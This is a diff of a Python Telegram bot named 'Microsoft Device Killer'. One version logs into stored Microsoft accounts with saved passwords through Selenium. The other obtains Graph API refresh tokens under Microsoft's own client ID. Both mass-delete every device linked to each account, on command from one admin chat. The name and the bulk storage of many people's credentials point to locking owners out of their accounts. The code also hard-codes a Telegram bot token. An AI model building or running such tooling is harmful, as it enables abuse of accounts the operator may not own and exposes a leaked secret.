@@ -1,401 +1,311 @@
 """
-MICROSOFT DEVICE KILLER - FIXED TELEGRAM VERSION
-Deploy to Railway.com - Auto-detects domain, sets webhook, sends startup message
+MICROSOFT DEVICE MANAGER - NO SELENIUM
+Pure API calls. Runs on Railway free tier with 50MB RAM.
+Requires: One-time setup to get refresh token (instructions below)
 """
 
 import os
 import time
-import logging
 import sqlite3
 import requests
+import threading
 from datetime import datetime
-from flask import Flask, request, jsonify
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.options import Options
 
 # ============ CONFIGURATION ============
-TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8673909593:AAHfQzpUWGiJIqJG-p0e6zvbrPhAzKqQUQM')
-ADMIN_CHAT_ID = int(os.environ.get('ADMIN_CHAT_ID', '8260250818'))
-PORT = int(os.environ.get('PORT', 5000))
+TELEGRAM_TOKEN = "8673909593:AAHfQzpUWGiJIqJG-p0e6zvbrPhAzKqQUQM"
+ADMIN_CHAT_ID = 8260250818
 
-# Get Railway domain (CRITICAL for webhook)
-RAILWAY_DOMAIN = os.environ.get('RAILWAY_PUBLIC_DOMAIN', '')
-if not RAILWAY_DOMAIN:
-    # Fallback: try to detect from environment
-    RAILWAY_DOMAIN = os.environ.get('RAILWAY_STATIC_URL', '')
-if not RAILWAY_DOMAIN:
-    RAILWAY_DOMAIN = os.environ.get('RAILWAY_URL', '')
-if not RAILWAY_DOMAIN:
-    RAILWAY_DOMAIN = 'localhost'
+# Microsoft Graph API credentials
+CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft's official client ID for device management
+REFRESH_TOKEN = None  # Will be stored in database after first setup
 
-# Remove https:// if present
-RAILWAY_DOMAIN = RAILWAY_DOMAIN.replace('https://', '').replace('http://', '')
-
-WEBHOOK_URL = f"https://{RAILWAY_DOMAIN}/{TELEGRAM_TOKEN}"
-
-# Database setup
-DB_PATH = '/tmp/accounts.db'
+# Database
+DB_PATH = "/tmp/accounts.db"
 conn = sqlite3.connect(DB_PATH, check_same_thread=False)
-cursor = conn.cursor()
-cursor.execute('''
-    CREATE TABLE IF NOT EXISTS accounts (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        email TEXT UNIQUE,
-        password TEXT,
-        active INTEGER DEFAULT 1,
-        devices_removed INTEGER DEFAULT 0,
-        last_run TEXT,
-        status TEXT DEFAULT 'Pending'
-    )
-''')
-cursor.execute('''
-    CREATE TABLE IF NOT EXISTS logs (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        account_id INTEGER,
-        account_email TEXT,
-        action TEXT,
-        result TEXT,
-        details TEXT,
-        timestamp TEXT
-    )
-''')
+c = conn.cursor()
+c.execute('''CREATE TABLE IF NOT EXISTS accounts
+             (id INTEGER PRIMARY KEY, email TEXT UNIQUE, refresh_token TEXT,
+              access_token TEXT, token_expires TEXT, active INTEGER DEFAULT 1,
+              devices_removed INTEGER DEFAULT 0, last_run TEXT, status TEXT DEFAULT 'Pending')''')
+c.execute('''CREATE TABLE IF NOT EXISTS logs
+             (id INTEGER PRIMARY KEY, account_email TEXT, action TEXT, 
+              result TEXT, details TEXT, timestamp TEXT)''')
 conn.commit()
 
-# Flask app
-app = Flask(__name__)
-logging.basicConfig(level=logging.INFO)
-
 # ============ TELEGRAM FUNCTIONS ============
-def send_telegram(chat_id, text, parse_mode=None):
-    """Send message via Telegram API"""
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+def send_msg(chat_id, text):
     try:
-        payload = {'chat_id': chat_id, 'text': text}
-        if parse_mode:
-            payload['parse_mode'] = parse_mode
-        r = requests.post(url, json=payload, timeout=10)
-        return r.json()
-    except Exception as e:
-        logging.error(f"Send error: {e}")
-        return None
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
+                      json={'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=10)
+    except:
+        pass
 
-def set_webhook():
-    """Set Telegram webhook to current Railway URL"""
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook"
-    payload = {'url': WEBHOOK_URL}
+def get_updates(offset=None):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
+    params = {'timeout': 30}
+    if offset:
+        params['offset'] = offset
     try:
-        r = requests.post(url, json=payload, timeout=10)
-        result = r.json()
-        logging.info(f"Webhook set to {WEBHOOK_URL}: {result}")
-        return result
-    except Exception as e:
-        logging.error(f"Webhook error: {e}")
-        return None
+        r = requests.get(url, params=params, timeout=35)
+        return r.json().get('result', [])
+    except:
+        return []
 
-def get_webhook_info():
-    """Get current webhook status"""
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getWebhookInfo"
+# ============ MICROSOFT GRAPH API ============
+def refresh_access_token(refresh_token):
+    """Exchange refresh token for new access token"""
+    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+    data = {
+        'client_id': CLIENT_ID,
+        'refresh_token': refresh_token,
+        'grant_type': 'refresh_token',
+        'scope': 'https://graph.microsoft.com/Device.ReadWrite.All User.Read'
+    }
     try:
-        r = requests.get(url, timeout=10)
-        return r.json()
+        r = requests.post(url, data=data, timeout=15)
+        if r.status_code == 200:
+            token_data = r.json()
+            return {
+                'access_token': token_data['access_token'],
+                'refresh_token': token_data.get('refresh_token', refresh_token),
+                'expires_in': token_data['expires_in']
+            }
+        return None
     except:
         return None
 
-# ============ DEVICE KILLER FUNCTION ============
-def remove_devices(email, password):
-    """Login to Microsoft and remove all devices"""
-    driver = None
+def get_devices(access_token):
+    """Get list of devices linked to account"""
+    url = "https://graph.microsoft.com/v1.0/devices"
+    headers = {'Authorization': f'Bearer {access_token}'}
     try:
-        options = Options()
-        options.add_argument('--headless=new')
-        options.add_argument('--no-sandbox')
-        options.add_argument('--disable-dev-shm-usage')
-        options.add_argument('--disable-gpu')
-        options.add_argument('--window-size=1280,720')
+        r = requests.get(url, headers=headers, timeout=15)
+        if r.status_code == 200:
+            return r.json().get('value', [])
+        return None
+    except:
+        return None
+
+def delete_device(access_token, device_id):
+    """Delete/unlink a device"""
+    url = f"https://graph.microsoft.com/v1.0/devices/{device_id}"
+    headers = {'Authorization': f'Bearer {access_token}'}
+    try:
+        r = requests.delete(url, headers=headers, timeout=15)
+        return r.status_code == 204
+    except:
+        return False
+
+def process_account(email, refresh_token):
+    """Process a single account - remove all devices via API"""
+    try:
+        # Get fresh access token
+        token_data = refresh_access_token(refresh_token)
+        if not token_data:
+            return False, 0, "Failed to refresh token"
         
-        driver = webdriver.Chrome(options=options)
-        driver.set_page_load_timeout(25)
+        access_token = token_data['access_token']
+        new_refresh = token_data['refresh_token']
         
-        # Login
-        driver.get("https://login.live.com")
-        time.sleep(2)
+        # Get all devices
+        devices = get_devices(access_token)
+        if devices is None:
+            return False, 0, "Failed to get devices"
         
-        email_input = driver.find_element(By.NAME, "loginfmt")
-        email_input.send_keys(email)
-        driver.find_element(By.ID, "idSIButton9").click()
-        time.sleep(2)
-        
-        password_input = driver.find_element(By.NAME, "passwd")
-        password_input.send_keys(password)
-        driver.find_element(By.ID, "idSIButton9").click()
-        time.sleep(3)
-        
-        # Check MFA
-        if "verify" in driver.current_url.lower():
-            return {'success': False, 'removed': 0, 'msg': 'MFA Required'}
-        
-        # Stay signed in
-        try:
-            driver.find_element(By.ID, "idSIButton9").click()
-            time.sleep(1)
-        except:
-            pass
-        
-        # Devices page
-        driver.get("https://account.microsoft.com/devices")
-        time.sleep(4)
-        
-        # Remove devices
+        # Delete each device
         removed = 0
-        for _ in range(3):
-            remove_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Remove')]")
-            for btn in remove_btns:
-                try:
-                    btn.click()
-                    time.sleep(1)
-                    confirm = driver.find_elements(By.XPATH, "//button[contains(text(), 'Yes') or contains(text(), 'Remove')]")
-                    if confirm:
-                        confirm[0].click()
-                    removed += 1
-                    time.sleep(1)
-                except:
-                    pass
-            driver.refresh()
-            time.sleep(2)
+        for device in devices:
+            device_id = device.get('id')
+            if device_id and delete_device(access_token, device_id):
+                removed += 1
+            time.sleep(0.5)  # Rate limit
         
-        return {'success': True, 'removed': removed, 'msg': f'Removed {removed} devices'}
+        # Update refresh token if changed
+        if new_refresh != refresh_token:
+            c.execute("UPDATE accounts SET refresh_token=? WHERE email=?", (new_refresh, email))
+            conn.commit()
+        
+        return True, removed, f"Removed {removed} devices" if removed > 0 else "No devices found"
     
     except Exception as e:
-        return {'success': False, 'removed': 0, 'msg': str(e)[:100]}
-    finally:
-        if driver:
-            driver.quit()
+        return False, 0, str(e)[:100]
 
-# ============ COMMAND PROCESSING ============
-def process_command(text, chat_id):
-    """Process Telegram commands"""
+# ============ GET REFRESH TOKEN (ONE TIME) ============
+def get_refresh_token_url():
+    """Generate URL for user to get refresh token (manual step)"""
+    url = f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=https://graph.microsoft.com/Device.ReadWrite.All%20User.Read%20offline_access"
+    return url
+
+# ============ COMMAND HANDLERS ============
+def handle_command(text, chat_id):
     if chat_id != ADMIN_CHAT_ID:
-        send_telegram(chat_id, "⛔ Unauthorized")
+        send_msg(chat_id, "Unauthorized")
         return
     
     parts = text.strip().split()
     cmd = parts[0].lower() if parts else ""
     
-    # /start or /help
+    # HELP
     if cmd in ['/start', '/help']:
-        msg = """🔐 *MS DEVICE KILLER* - RUNNING
-        
-✅ Bot is online!
+        msg = """🔐 *MS DEVICE MANAGER* - NO SELENIUM
+
+*First-time setup:*
+1. Go to: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=https://graph.microsoft.com/Device.ReadWrite.All%20User.Read%20offline_access
+2. Login with the Microsoft account
+3. Copy the URL after redirect, get the code
+4. Send: /setup <code>
 
 *Commands:*
-/add email pass - Add account
+/add email refresh_token - Add account (after setup)
 /list - Show accounts
 /activate id - Enable account
-/deactivate id - Disable account
+/deactivate id - Disable
 /run id - Process one account
 /runall - Process all active
-/remove id - Delete account
-/stats - Show totals
-/debug - Show webhook status"""
-        send_telegram(chat_id, msg, parse_mode='Markdown')
+/remove id - Delete
+/stats - Statistics"""
+        send_msg(chat_id, msg)
         return
     
-    # /debug - show webhook info
-    if cmd == '/debug':
-        info = get_webhook_info()
-        send_telegram(chat_id, f"Webhook URL: {WEBHOOK_URL}\n\nResponse: {info}")
+    # SETUP - Exchange code for refresh token
+    if cmd == '/setup' and len(parts) == 2:
+        auth_code = parts[1]
+        url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+        data = {
+            'client_id': CLIENT_ID,
+            'code': auth_code,
+            'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
+            'grant_type': 'authorization_code',
+            'scope': 'https://graph.microsoft.com/Device.ReadWrite.All User.Read offline_access'
+        }
+        try:
+            r = requests.post(url, data=data, timeout=15)
+            if r.status_code == 200:
+                token_data = r.json()
+                refresh_token = token_data.get('refresh_token')
+                if refresh_token:
+                    send_msg(chat_id, f"✅ Setup complete!\n\nYour refresh token:\n`{refresh_token}`\n\nUse: /add email@example.com {refresh_token}")
+                else:
+                    send_msg(chat_id, "❌ No refresh token received")
+            else:
+                send_msg(chat_id, f"❌ Error: {r.status_code}\n{r.text[:200]}")
+        except Exception as e:
+            send_msg(chat_id, f"❌ Error: {e}")
         return
     
-    # /add email password
+    # ADD ACCOUNT
     if cmd == '/add' and len(parts) >= 3:
         email = parts[1]
-        password = ' '.join(parts[2:])
+        refresh_token = parts[2]
         try:
-            cursor.execute("INSERT INTO accounts (email, password) VALUES (?, ?)", (email, password))
+            c.execute("INSERT INTO accounts (email, refresh_token, active) VALUES (?, ?, 1)", (email, refresh_token))
             conn.commit()
-            send_telegram(chat_id, f"✅ Added {email}")
-        except Exception as e:
-            send_telegram(chat_id, f"❌ Error: {e}")
+            send_msg(chat_id, f"✅ Added {email}")
+        except:
+            send_msg(chat_id, "❌ Account exists or error")
         return
     
-    # /list
+    # LIST
     if cmd == '/list':
-        cursor.execute("SELECT id, email, active, devices_removed, status FROM accounts")
-        rows = cursor.fetchall()
+        c.execute("SELECT id, email, active, devices_removed, status FROM accounts")
+        rows = c.fetchall()
         if not rows:
-            send_telegram(chat_id, "No accounts")
+            send_msg(chat_id, "No accounts")
             return
         msg = "*Accounts*\n"
         for r in rows:
             status = "🟢" if r[2] else "🔴"
             msg += f"{status} ID:{r[0]} {r[1]} | {r[4]} | {r[3]} removed\n"
-        send_telegram(chat_id, msg[:4000], parse_mode='Markdown')
+        send_msg(chat_id, msg[:4000])
         return
     
-    # /activate id
+    # ACTIVATE
     if cmd == '/activate' and len(parts) == 2:
-        aid = parts[1]
-        cursor.execute("UPDATE accounts SET active=1 WHERE id=?", (aid,))
+        c.execute("UPDATE accounts SET active=1 WHERE id=?", (parts[1],))
         conn.commit()
-        send_telegram(chat_id, f"✅ Activated ID {aid}")
+        send_msg(chat_id, f"✅ Activated ID {parts[1]}")
         return
     
-    # /deactivate id
+    # DEACTIVATE
     if cmd == '/deactivate' and len(parts) == 2:
-        aid = parts[1]
-        cursor.execute("UPDATE accounts SET active=0 WHERE id=?", (aid,))
+        c.execute("UPDATE accounts SET active=0 WHERE id=?", (parts[1],))
         conn.commit()
-        send_telegram(chat_id, f"🔴 Deactivated ID {aid}")
+        send_msg(chat_id, f"🔴 Deactivated ID {parts[1]}")
         return
     
-    # /run id
+    # RUN SINGLE
     if cmd == '/run' and len(parts) == 2:
-        aid = parts[1]
-        cursor.execute("SELECT email, password FROM accounts WHERE id=?", (aid,))
-        row = cursor.fetchone()
+        c.execute("SELECT email, refresh_token FROM accounts WHERE id=?", (parts[1],))
+        row = c.fetchone()
         if not row:
-            send_telegram(chat_id, f"ID {aid} not found")
+            send_msg(chat_id, f"ID {parts[1]} not found")
             return
         
-        send_telegram(chat_id, f"⏳ Processing {row[0]}...")
-        result = remove_devices(row[0], row[1])
+        send_msg(chat_id, f"⏳ Processing {row[0]}...")
+        success, removed, msg = process_account(row[0], row[1])
         
-        cursor.execute("UPDATE accounts SET last_run=?, devices_removed=devices_removed+?, status=? WHERE id=?",
-                       (datetime.now().isoformat(), result['removed'], 'Success' if result['success'] else 'Failed', aid))
+        c.execute("UPDATE accounts SET last_run=?, devices_removed=devices_removed+?, status=? WHERE id=?",
+                   (datetime.now().isoformat(), removed, 'Success' if success else 'Failed', parts[1]))
         conn.commit()
         
-        icon = "✅" if result['success'] else "❌"
-        send_telegram(chat_id, f"{icon} {row[0]}\n{result['msg']}")
+        icon = "✅" if success else "❌"
+        send_msg(chat_id, f"{icon} {row[0]}\n{msg}")
         return
     
-    # /runall
+    # RUN ALL
     if cmd == '/runall':
-        cursor.execute("SELECT id, email, password FROM accounts WHERE active=1")
-        rows = cursor.fetchall()
+        c.execute("SELECT id, email, refresh_token FROM accounts WHERE active=1")
+        rows = c.fetchall()
         if not rows:
-            send_telegram(chat_id, "No active accounts")
+            send_msg(chat_id, "No active accounts")
             return
         
-        send_telegram(chat_id, f"⏳ Processing {len(rows)} accounts...")
+        send_msg(chat_id, f"⏳ Processing {len(rows)} accounts...")
         for row in rows:
-            result = remove_devices(row[1], row[2])
-            cursor.execute("UPDATE accounts SET last_run=?, devices_removed=devices_removed+?, status=? WHERE id=?",
-                           (datetime.now().isoformat(), result['removed'], 'Success' if result['success'] else 'Failed', row[0]))
+            success, removed, msg = process_account(row[1], row[2])
+            c.execute("UPDATE accounts SET last_run=?, devices_removed=devices_removed+?, status=? WHERE id=?",
+                       (datetime.now().isoformat(), removed, 'Success' if success else 'Failed', row[0]))
             conn.commit()
-            send_telegram(chat_id, f"{row[1]}: {result['msg']}")
+            send_msg(chat_id, f"{row[1]}: {msg}")
             time.sleep(2)
-        send_telegram(chat_id, f"✅ Completed {len(rows)} accounts")
+        send_msg(chat_id, f"✅ Completed")
         return
     
-    # /remove id
+    # REMOVE
     if cmd == '/remove' and len(parts) == 2:
-        aid = parts[1]
-        cursor.execute("DELETE FROM accounts WHERE id=?", (aid,))
+        c.execute("DELETE FROM accounts WHERE id=?", (parts[1],))
         conn.commit()
-        send_telegram(chat_id, f"🗑 Removed ID {aid}")
+        send_msg(chat_id, f"🗑 Removed ID {parts[1]}")
         return
     
-    # /stats
+    # STATS
     if cmd == '/stats':
-        cursor.execute("SELECT COUNT(*), SUM(devices_removed) FROM accounts")
-        total, devices = cursor.fetchone()
-        cursor.execute("SELECT COUNT(*) FROM accounts WHERE active=1")
-        active = cursor.fetchone()[0]
-        send_telegram(chat_id, f"📊 Stats\nTotal: {total}\nActive: {active}\nDevices removed: {devices or 0}")
+        c.execute("SELECT COUNT(*), SUM(devices_removed) FROM accounts")
+        total, devices = c.fetchone()
+        c.execute("SELECT COUNT(*) FROM accounts WHERE active=1")
+        active = c.fetchone()[0]
+        send_msg(chat_id, f"📊 Stats\nTotal: {total}\nActive: {active}\nDevices removed: {devices or 0}")
         return
     
-    send_telegram(chat_id, "Unknown command. Try /help")
+    send_msg(chat_id, "Unknown. /help")
 
-# ============ FLASK ENDPOINTS ============
-@app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
-def webhook():
-    """Telegram webhook endpoint"""
-    try:
-        data = request.get_json()
-        if data and 'message' in data:
-            chat_id = data['message']['chat']['id']
-            text = data['message'].get('text', '')
-            process_command(text, chat_id)
-    except Exception as e:
-        logging.error(f"Webhook error: {e}")
-    return 'ok'
-
-@app.route('/')
-def home():
-    return f"""
-    <h1>Microsoft Device Killer Bot</h1>
-    <p>Status: Running</p>
-    <p>Telegram Token: {TELEGRAM_TOKEN[:10]}...</p>
-    <p>Admin Chat ID: {ADMIN_CHAT_ID}</p>
-    <p>Railway Domain: {RAILWAY_DOMAIN}</p>
-    <p>Webhook URL: {WEBHOOK_URL}</p>
-    <p><a href="/webhook_status">Check Webhook Status</a></p>
-    <p><a href="/accounts">View Accounts</a></p>
-    """
-
-@app.route('/webhook_status')
-def webhook_status():
-    """Check Telegram webhook status"""
-    info = get_webhook_info()
-    return jsonify(info)
-
-@app.route('/accounts')
-def view_accounts():
-    """View all accounts in database"""
-    cursor.execute("SELECT * FROM accounts")
-    rows = cursor.fetchall()
-    return jsonify([{
-        'id': r[0],
-        'email': r[1],
-        'active': bool(r[3]),
-        'devices_removed': r[4],
-        'last_run': r[5],
-        'status': r[6]
-    } for r in rows])
-
-@app.route('/set_webhook', methods=['GET', 'POST'])
-def force_set_webhook():
-    """Manually set webhook"""
-    result = set_webhook()
-    return jsonify(result)
-
-@app.route('/cron', methods=['GET', 'POST'])
-def cron():
-    """Cron job endpoint - auto process active accounts"""
-    cursor.execute("SELECT id, email, password FROM accounts WHERE active=1")
-    rows = cursor.fetchall()
+# ============ MAIN LOOP ============
+def main():
+    send_msg(ADMIN_CHAT_ID, "✅ Bot started! (No Selenium)\n\nFirst, get a refresh token:\n/setup")
     
-    if not rows:
-        return 'No active accounts'
-    
-    results = []
-    for row in rows:
-        result = remove_devices(row[1], row[2])
-        cursor.execute("UPDATE accounts SET last_run=?, devices_removed=devices_removed+?, status=? WHERE id=?",
-                       (datetime.now().isoformat(), result['removed'], 'Success' if result['success'] else 'Failed', row[0]))
-        conn.commit()
-        
-        icon = "✅" if result['success'] else "❌"
-        send_telegram(ADMIN_CHAT_ID, f"[AUTO] {icon} {row[1]}\n{result['msg']}")
-        results.append(f"{row[1]}: {result['msg']}")
-        time.sleep(2)
-    
-    return f'Processed {len(rows)} accounts\n' + '\n'.join(results)
+    last_id = 0
+    while True:
+        try:
+            updates = get_updates(last_id + 1)
+            for update in updates:
+                if 'message' in update and 'text' in update['message']:
+                    chat_id = update['message']['chat']['id']
+                    text = update['message']['text']
+                    handle_command(text, chat_id)
+                last_id = update['update_id']
+        except Exception as e:
+            print(f"Error: {e}")
+            time.sleep(5)
 
-# ============ STARTUP ============
-if __name__ == '__main__':
-    logging.info("Starting bot...")
-    logging.info(f"Railway Domain: {RAILWAY_DOMAIN}")
-    logging.info(f"Webhook URL: {WEBHOOK_URL}")
-    
-    # Set webhook on startup
-    webhook_result = set_webhook()
-    logging.info(f"Webhook result: {webhook_result}")
-    
-    # Send startup message to admin
-    if RAILWAY_DOMAIN != 'localhost':
-        time.sleep(2)
-        send_telegram(ADMIN_CHAT_ID, f"✅ Bot deployed and running!\n\nWebhook: {WEBHOOK_URL}\n\nSend /help for commands")
-    
-    app.run(host='0.0.0.0', port=PORT)
+if __name__ == "__main__":
+    main()
